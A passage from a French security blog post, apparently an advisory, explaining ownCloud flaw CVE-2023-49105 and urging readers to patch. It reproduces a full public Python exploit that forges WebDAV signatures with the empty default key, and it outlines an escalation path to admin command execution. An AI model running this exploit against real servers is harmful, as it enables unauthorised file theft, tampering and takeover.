        data-srcset="/images/pwncloud/2023-12-11_16-11.png, /images/pwncloud/2023-12-11_16-11.png 1.5x, /images/pwncloud/2023-12-11_16-11.png 2x"
        data-sizes="auto"
        alt="/images/pwncloud/2023-12-11_16-11.png"
        title="CVE-2023-49105" /></p>
<p>Quelques rappels concernant la vulnérabilité CVE-2023-49105 :</p>
<ul>
<li>Le score CVSS est de 9.8 😨.</li>
<li>Il est possible de lire, écrire et supprimer des fichiers en contournant l&rsquo;authentification de l&rsquo;Api WebDAV.</li>
</ul>
<p>Ambionics a sorti un très bon article sur ce sujet : <a href="https://www.ambionics.io/blog/owncloud-cve-2023-49103-cve-2023-49105" target="_blank" rel="noopener noreffer ">https://www.ambionics.io/blog/owncloud-cve-2023-49103-cve-2023-49105</a></p>
<h3 id="en-bref-1">En bref</h3>
<p>En résumé, il existe 2 scénarios d&rsquo;exploitation possibles :</p>
<ol>
<li><strong>Scénario anonyme</strong> : récupérer tous les fichiers de n&rsquo;importe quel compte en étant anonyme.</li>
<li><strong>Scénario authentifié</strong> : élever ses privilèges de simple utilisateur en tant qu&rsquo;administrateur afin d&rsquo;exécuter des commandes.</li>
</ol>
<p>👇 Un PoC est disponible sur <a href="https://github.com/ambionics/owncloud-exploits/blob/main/pwncloud-webdav.py" target="_blank" rel="noopener noreffer ">GitHub</a> et juste en dessous</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Owncloud Privilege Escalation CVE-2023-49105 pwnCloud</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 2023-12-05</span>
</span></span><span class="line"><span class="cl"><span class="c1"># cfreal</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># DESCRIPTION</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Exploit demonstrating a consequence of CVE-2023-49105: arbitrary access to WEBDAV</span>
</span></span><span class="line"><span class="cl"><span class="c1"># resources, including every file stored by a user.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># EXAMPLE</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $ ./pwncloud-webdav.py http://target.com/ admin</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># REQUIREMENTS</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># requires ten (https://github.com/cfreal/ten)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">SimpleHTTPRequestHandler</span><span class="p">,</span> <span class="n">ThreadingHTTPServer</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ten</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tenlib.transform</span> <span class="kn">import</span> <span class="n">url</span> <span class="k">as</span> <span class="n">turl</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@entry</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">listen</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;localhost:8800&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Setup ProxyHandler</span>
</span></span><span class="line"><span class="cl">    <span class="n">ProxyHandler</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">ScopedSession</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ProxyHandler.session.burp()</span>
</span></span><span class="line"><span class="cl">    <span class="n">ProxyHandler</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Display info</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg_success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Proxy server running on </span><span class="si">{</span><span class="n">listen</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">dav_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;dav://anonymous@</span><span class="si">{</span><span class="n">listen</span><span class="si">}</span><span class="s2">/remote.php/dav&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">msg_info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Browse user files: </span><span class="si">{</span><span class="n">dav_url</span><span class="si">}</span><span class="s2">/files/</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg_info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Browse everything: </span><span class="si">{</span><span class="n">dav_url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Setup HTTP server</span>
</span></span><span class="line"><span class="cl">    <span class="n">listen_host</span><span class="p">,</span> <span class="n">listen_port</span> <span class="o">=</span> <span class="n">listen</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">listen_port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">listen_port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">proxy_server</span> <span class="o">=</span> <span class="n">ThreadingHTTPServer</span><span class="p">((</span><span class="n">listen_host</span><span class="p">,</span> <span class="n">listen_port</span><span class="p">),</span> <span class="n">ProxyHandler</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">proxy_server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">msg_failure</span><span class="p">(</span><span class="s2">&#34;Shutting down the proxy server.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">proxy_server</span><span class="o">.</span><span class="n">server_close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ProxyHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">ScopedSession</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span><span class="p">:</span> <span class="nb">str</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">do_ANY</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Fix bug where ownCloud does not realize /remote.php/dav is equal to</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># /remote.php/dav/ and raises an error</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span> <span class="o">==</span> <span class="s2">&#34;/remote.php/dav&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">path</span> <span class="o">+=</span> <span class="s2">&#34;/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Add OC-* and signature to the URL</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">build_signed_url</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">command</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get_absolute_url</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Prepare headers</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="n">header</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="n">header</span><span class="p">]</span> <span class="k">for</span> <span class="n">header</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Host&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">turl</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">netloc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># TODO stream input</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">size</span> <span class="o">:=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;Content-Length&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">rfile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">request</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">command</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">stream</span><span class="o">=</span><span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">header</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="n">header</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stream the response content to the client</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">iter_content</span><span class="p">(</span><span class="n">chunk_size</span><span class="o">=</span><span class="mi">8192</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">do_OPTIONS</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_GET</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_HEAD</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_POST</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_PUT</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_DELETE</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_TRACE</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_COPY</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_LOCK</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_MKCOL</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_MOVE</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_PROPFIND</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_PROPPATCH</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">    <span class="n">do_UNLOCK</span> <span class="o">=</span> <span class="n">do_ANY</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compute_hash</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">signing_key</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">iterations</span> <span class="o">=</span> <span class="mi">10000</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">pbkdf2_hmac</span><span class="p">(</span><span class="s2">&#34;sha512&#34;</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">signing_key</span><span class="p">,</span> <span class="n">iterations</span><span class="p">,</span> <span class="n">dklen</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_signed_url</span><span class="p">(</span><span class="n">method</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">parsed</span> <span class="o">=</span> <span class="n">turl</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">params</span> <span class="o">=</span> <span class="n">qs</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">parsed</span><span class="o">.</span><span class="n">query</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">params</span><span class="p">[</span><span class="s2">&#34;OC-Credential&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl">    <span class="n">params</span><span class="p">[</span><span class="s2">&#34;OC-Verb&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">method</span>
</span></span><span class="line"><span class="cl">    <span class="n">params</span><span class="p">[</span><span class="s2">&#34;OC-Expires&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;1000&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">params</span><span class="p">[</span><span class="s2">&#34;OC-Date&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">parsed</span> <span class="o">=</span> <span class="n">parsed</span><span class="o">.</span><span class="n">_replace</span><span class="p">(</span><span class="n">query</span><span class="o">=</span><span class="n">qs</span><span class="o">.</span><span class="n">unparse</span><span class="p">(</span><span class="n">params</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">params</span><span class="p">[</span><span class="s2">&#34;OC-Signature&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">compute_hash</span><span class="p">(</span><span class="n">turl</span><span class="o">.</span><span class="n">unparse</span><span class="p">(</span><span class="n">parsed</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">parsed</span> <span class="o">=</span> <span class="n">parsed</span><span class="o">.</span><span class="n">_replace</span><span class="p">(</span><span class="n">query</span><span class="o">=</span><span class="n">qs</span><span class="o">.</span><span class="n">unparse</span><span class="p">(</span><span class="n">params</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">turl</span><span class="o">.</span><span class="n">unparse</span><span class="p">(</span><span class="n">parsed</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br>
<h3 id="etude-du-scénario-le-plus-probable--scénario-anonyme">Etude du scénario le plus probable : scénario anonyme</h3>
<p>Le scénario le plus probable de se produire est celui <strong>anonyme</strong>. Il est aussi le plus simple à expliquer et à exploiter contrairement au second.</p>
<p>Les grandes lignes de l&rsquo;attaque :</p>
<ol>
<li>L&rsquo;attaquant accéde au service <code>WebDAV</code> présent sur <code>/remote.php/dav</code>. <code>WebDAV</code> est une extension de <code>HTTP</code> et permet de simplifier la gestion de fichiers avec des serveurs distants.</li>
<li>OwnCloud autorise l&rsquo;authentification à partir d&rsquo;un username et d&rsquo;une clef de signature.</li>
<li>Par défaut, la clef définie est <strong>VIDE</strong> (!!!) 😱</li>
<li>L&rsquo;attaquant usurpe l&rsquo;identité de n&rsquo;importe quel utilisateur juste en connaissant le nom d&rsquo;utilisateur.</li>
<li>L&rsquo;attaquant accède au <code>WebDAV</code> et consulte/modifie/supprime n&rsquo;importe quel fichier 😭</li>
</ol>
<h3 id="etude-du-scénario-le-moins-probable--scénario-authentifié">Etude du scénario le moins probable : scénario authentifié</h3>
<p>Ce scénario est moins probable car il nécessite un <strong>compte authentifié</strong>. Il est plus complexe à mettre en place et permet une exécution de commande. Comme vu précédemment, il est possible d&rsquo;utiliser la signature vide de n&rsquo;importe quel utilisateur. Or, il est impossible d&rsquo;accéder aux fonctionnalités de l&rsquo;utilisateur et de l&rsquo;administrateur avec. Un contournement est alors possible !</p>
<p>Dans les grandes lignes :</p>
<ol>
<li>L&rsquo;attaquant s&rsquo;authentifie en tant que simple utilisateur.</li>
<li>L&rsquo;attaquant rajoute un entête Authorization invalide à ses requêtes. Exemple : Authorization: token thisisnotavalidtoken</li>
<li>L&rsquo;attaquant s&rsquo;authentifie avec un username usurpé et sa clef de signature.</li>
<li>L&rsquo;attaquant change la valeur user_id par admin pour monter en privilège (oui je sais sans le code sous les yeux ce n&rsquo;est pas clair)</li>
<li>Un administrateur OwnCloud possède des fonctionnalités pour exécuter des commandes.</li>
</ol>
<p>👇 Ci-dessous, une vidéo réalisée par Charles Fol, le rédacteur de l&rsquo;article concernant le scénario anonyme. Patchez vos instances !</p>
<p><video src="/images/pwncloud/exploit-privilege-escalation.mp4" controls autoplay loop title="Exploitation WebDav OwnCloud" style="width:100%"></video></p>
<h2 id="cve-2023-49104">CVE-2023-49104</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/pwncloud/2023-12-11_16-13.png"
        data-srcset="/images/pwncloud/2023-12-11_16-13.png, /images/pwncloud/2023-12-11_16-13.png 1.5x, /images/pwncloud/2023-12-11_16-13.png 2x"
        data-sizes="auto"
        alt="/images/pwncloud/2023-12-11_16-13.png"
        title="Alt text" /></p>
<p>Selon OwnCloud, un attaquant est capable de contourner le code de validation oAuth2 via une URL particulière. Une étude est actuellement en cours sur cette vulnérabilité et des explications devront venir dans les jours à venir.</p>
<h2 id="sources">Sources</h2>
<ul>
<li><a href="https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/" target="_blank" rel="noopener noreffer ">https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/</a></li>
<li><a href="https://www.greynoise.io/blog/cve-2023-49103-owncloud-critical-vulnerability-quickly-exploited-in-the-wild" target="_blank" rel="noopener noreffer ">https://www.greynoise.io/blog/cve-2023-49103-owncloud-critical-vulnerability-quickly-exploited-in-the-wild</a></li>
<li><a href="https://www.ambionics.io/blog/owncloud-cve-2023-49103-cve-2023-49105" target="_blank" rel="noopener noreffer ">https://www.ambionics.io/blog/owncloud-cve-2023-49103-cve-2023-49105</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Mis à jour le 08/12/2023</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9/index.md" target="_blank">Lire Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Partager sur Twitter" data-sharer="twitter" data-url="http://localhost:1313/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9/" data-title="Pwncloud : votre propre cloud (non) sécurisé" data-via="trackflaw" data-hashtags="Pwncloud,Pentest,Cloud"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Facebook" data-sharer="facebook" data-url="http://localhost:1313/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9/" data-hashtag="Pwncloud"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9/" data-title="Pwncloud : votre propre cloud (non) sécurisé"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Line" data-sharer="line" data-url="http://localhost:1313/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9/" data-title="Pwncloud : votre propre cloud (non) sécurisé"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur 微博" data-sharer="weibo" data-url="http://localhost:1313/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9/" data-title="Pwncloud : votre propre cloud (non) sécurisé" data-image="/images/pwncloud/pwncloud.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/pwncloud/">Pwncloud</a>,&nbsp;<a href="/tags/pentest/">Pentest</a>,&nbsp;<a href="/tags/cloud/">Cloud</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Retour</a></span>&nbsp;|&nbsp;<span><a href="/">Accueil</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/reverse-tabnabbing-phishing-sous-st%C3%A9ro%C3%AFdes/" class="prev" rel="prev" title="Le reverse tab nabbing, méthode de phishing sous stéroïdes."><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Le reverse tab nabbing, méthode de phishing sous stéroïdes.</a>
            <a href="/choisir-son-prestataire-de-test-intrusion/" class="next" rel="next" title="Comment bien choisir un prestataire de tests d&#39;intrusion en 2024 ?">Comment bien choisir un prestataire de tests d'intrusion en 2024 ?<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Trackflaw</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Remonter en haut">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="Afficher les commentaires">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
